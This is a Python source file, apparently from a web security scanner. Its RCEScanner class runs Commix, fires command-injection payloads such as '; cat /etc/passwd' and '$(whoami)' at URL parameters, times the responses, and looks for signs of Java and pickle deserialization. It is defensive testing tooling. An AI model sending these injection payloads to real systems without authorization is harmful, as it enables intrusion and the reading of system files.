"""Remote Code Execution vulnerability scanner."""
from typing import List
import re
from urllib.parse import urlparse, parse_qs
from loguru import logger

from src.scanner.base_scanner import BaseScanner
from src.scanner.models import Vulnerability, Severity


class RCEScanner(BaseScanner):
    """Scanner for Remote Code Execution vulnerabilities using Commix and manual testing."""
    
    # Command injection payloads for different OS
    PAYLOADS = {
        "unix": [
            "; sleep 5",
            "| sleep 5",
            "` sleep 5 `",
            "$( sleep 5 )",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            "& ping -c 5 127.0.0.1",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "|| whoami",
            "& whoami",
            "&& whoami",
            "`whoami`",
            "$(whoami)",
        ],
        "windows": [
            "& timeout 5",
            "| timeout 5",
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "& whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
        ]
    }
    
    def scan(self) -> List[Vulnerability]:
        """Scan for RCE vulnerabilities using Commix and manual testing."""
        logger.info(f"Starting RCE scan on {self.target}")
        vulnerabilities = []
        
        # 1. Run Commix for automated command injection detection
        if self.get_intensity_level() >= 2:
            commix_vulns = self._run_commix()
            vulnerabilities.extend(commix_vulns)
        
        # 2. Manual command injection testing
        manual_vulns = self._manual_command_injection()
        vulnerabilities.extend(manual_vulns)
        
        # 3. Test for deserialization RCE
        if self.get_intensity_level() >= 3:
            deser_vulns = self._test_deserialization_rce()
            vulnerabilities.extend(deser_vulns)
        
        logger.info(f"RCE scan found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    def _run_commix(self) -> List[Vulnerability]:
        """Run Commix tool for automated command injection detection."""
        vulnerabilities = []
        
        command = [
            "commix",
            "--url", self.target,
            "--batch",
            "--level", str(min(self.get_intensity_level(), 3)),
            "--technique", "CBET",  # Classic, Eval-based, Time-based
            "--answers", "quit=N",
            "--timeout", str(self.timeout),
        ]
        
        logger.info(f"Running Commix: {' '.join(command)}")
        result = self.run_kali_tool(command)
        
        if result["success"]:
            vulns = self._parse_commix_output(result["stdout"])
            vulnerabilities.extend(vulns)
        else:
            logger.warning(f"Commix not available or failed: {result['stderr']}")
        
        return vulnerabilities
    
    def _parse_commix_output(self, output: str) -> List[Vulnerability]:
        """Parse Commix output to extract RCE vulnerabilities."""
        vulnerabilities = []
        
        # Look for successful exploitation indicators
        if "appears to be injectable" in output.lower() or "vulnerable" in output.lower():
            # Extract parameter name if available
            param_match = re.search(r"parameter[\s'\"]*:?[\s'\"]*([\ w]+)", output, re.IGNORECASE)
            param_name = param_match.group(1) if param_match else "unknown"
            
            vuln = self.create_vulnerability(
                vuln_type="rce",
                title=f"Command Injection in parameter '{param_name}'",
                description=f"Commix detected command injection vulnerability. The parameter '{param_name}' allows execution of arbitrary system commands.",
                severity=Severity.CRITICAL,
                location=self.target,
                parameter=param_name,
                cvss_score=10.0,
                cwe_id="CWE-78",
                steps_to_reproduce=[
                    f"1. Run Commix against: {self.target}",
                    f"2. Parameter '{param_name}' is injectable",
                    "3. Use Commix to execute arbitrary commands",
                    "4. Potential for full system compromise",
                ],
                remediation="Never execute user input as system commands. Use allowlists for valid inputs. Implement proper input validation and sanitization. Use language-specific safe APIs instead of system calls.",
                references=[
                    "https://owasp.org/www-community/attacks/Command_Injection",
                    "https://cwe.mitre.org/data/definitions/78.html"
                ],
                evidence=output[:2000]
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _manual_command_injection(self) -> List[Vulnerability]:
        """Manual command injection testing with time-based detection."""
        vulnerabilities = []
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        if not params:
            # Test common parameter names
            params = {"cmd": [""], "exec": [""], "command": [""], "execute": [""], "ping": [""], "ip": [""]}
        
        # Test both Unix and Windows payloads
        all_payloads = self.PAYLOADS["unix"] + self.PAYLOADS["windows"]
        
        for param_name in params.keys():
            for payload in all_payloads[:10]:  # Test first 10 payloads per param
                # Time-based detection for sleep/ping commands
                if "sleep" in payload or "timeout" in payload or "ping" in payload:
                    import time
                    start = time.time()
                    response = self.http_request("GET", params={param_name: payload})
                    elapsed = time.time() - start
                    
                    # If response took significantly longer, possible command injection
                    if elapsed >= 4.5:  # Should be ~5 seconds
                        vuln = self.create_vulnerability(
                            vuln_type="rce",
                            title=f"Time-based Command Injection in '{param_name}'",
                            description=f"The parameter '{param_name}' is vulnerable to time-based command injection. Payload caused measurable delay indicating command execution.",
                            severity=Severity.CRITICAL,
                            location=self.target,
                            parameter=param_name,
                            payload=payload,
                            cvss_score=10.0,
                            cwe_id="CWE-78",
                            steps_to_reproduce=[
                                f"1. Send request with parameter {param_name}={payload}",
                                f"2. Observe response delay of ~{elapsed:.1f} seconds",
                                "3. Indicates command execution on server",
                            ],
                            remediation="Implement strict input validation. Never pass user input to system commands. Use allowlists and safe APIs.",
                            metadata={"response_time": elapsed}
                        )
                        vulnerabilities.append(vuln)
                        logger.warning(f"Found time-based command injection in {param_name}")
                        break
                else:
                    # Content-based detection
                    response = self.http_request("GET", params={param_name: payload})
                    if response and self._is_rce_vulnerable(response):
                        vuln = self.create_vulnerability(
                            vuln_type="rce",
                            title=f"Command Injection in '{param_name}'",
                            description=f"The parameter '{param_name}' allows execution of system commands. Command output is visible in the response.",
                            severity=Severity.CRITICAL,
                            location=self.target,
                            parameter=param_name,
                            payload=payload,
                            cvss_score=10.0,
                            cwe_id="CWE-78",
                            evidence=response.text[:500],
                            steps_to_reproduce=[
                                f"1. Set parameter {param_name}={payload}",
                                "2. Observe command execution output in response",
                            ],
                            remediation="Never execute user input as commands. Use input validation and safe APIs.",
                        )
                        vulnerabilities.append(vuln)
                        break
        
        return vulnerabilities
    
    def _test_deserialization_rce(self) -> List[Vulnerability]:
        """Test for unsafe deserialization leading to RCE."""
        vulnerabilities = []
        
        # Test for Java deserialization
        java_result = self._test_java_deserialization()
        vulnerabilities.extend(java_result)
        
        # Test for Python pickle
        python_result = self._test_python_deserialization()
        vulnerabilities.extend(python_result)
        
        return vulnerabilities
    
    def _test_java_deserialization(self) -> List[Vulnerability]:
        """Test for Java deserialization vulnerabilities."""
        vulnerabilities = []
        
        # Check if target appears to be Java-based
        response = self.http_request("GET")
        if not response:
            return vulnerabilities
        
        java_indicators = ["jsessionid", "j_security_check", "java", ".jsp", ".do"]
        is_java = any(indicator in response.text.lower() or indicator in str(response.headers).lower() 
                     for indicator in java_indicators)
        
        if is_java:
            logger.info("Java application detected, testing for deserialization")
            
            # Look for serialized Java objects (base64 encoded typically start with specific bytes)
            # rO0AB is base64 for Java serialization magic bytes
            if "ro0ab" in response.text.lower() or "aced" in response.text.lower():
                vuln = self.create_vulnerability(
                    vuln_type="rce",
                    title="Potential Java Deserialization Vulnerability",
                    description="Application appears to use Java serialization which may be exploitable for RCE if using vulnerable libraries (Apache Commons, Spring, etc.)",
                    severity=Severity.HIGH,
                    location=self.target,
                    cvss_score=9.0,
                    cwe_id="CWE-502",
                    steps_to_reproduce=[
                        "1. Application uses Java serialization (detected)",
                        "2. Generate payload with ysoserial for known gadget chains",
                        "3. Send serialized payload to application",
                        "4. If vulnerable libraries present, RCE possible",
                    ],
                    remediation="Avoid deserializing untrusted data. Use allowlists for classes. Upgrade vulnerable libraries. Consider using safer serialization formats like JSON.",
                    references=[
                        "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
                        "https://github.com/frohoff/ysoserial"
                    ]
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_python_deserialization(self) -> List[Vulnerability]:
        """Test for Python pickle deserialization vulnerabilities."""
        vulnerabilities = []
        
        # Test common pickle indicators
        response = self.http_request("GET")
        if not response:
            return vulnerabilities
        
        # Look for pickle patterns
        if b"\x80" in response.content[:100]:  # Pickle protocol marker
            vuln = self.create_vulnerability(
                vuln_type="rce",
                title="Potential Python Pickle Deserialization Vulnerability",
                description="Application may be using Python pickle for serialization, which is inherently unsafe for untrusted data and can lead to RCE.",
                severity=Severity.HIGH,
                location=self.target,
                cvss_score=9.0,
                cwe_id="CWE-502",
                remediation="Never unpickle untrusted data. Use JSON or other safe serialization formats.",
            )
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _is_rce_vulnerable(self, response) -> bool:
        """Check if response indicates successful RCE."""
        # Unix/Linux indicators
        unix_indicators = [
            "uid=", "gid=", "groups=",
            "root:x:", "bin:x:",  # /etc/passwd patterns
            "drwx", "-rw-",  # ls output
            "/bin/", "/usr/", "/etc/",
            "linux", "gnu",
        ]
        
        # Windows indicators
        windows_indicators = [
            "volume serial number",
            "directory of",
            "c:\\",
            "windows",
            "administrator",
            "system32",
        ]
        
        response_text = response.text.lower()
        
        return (any(ind in response_text for ind in unix_indicators) or 
                any(ind in response_text for ind in windows_indicators))
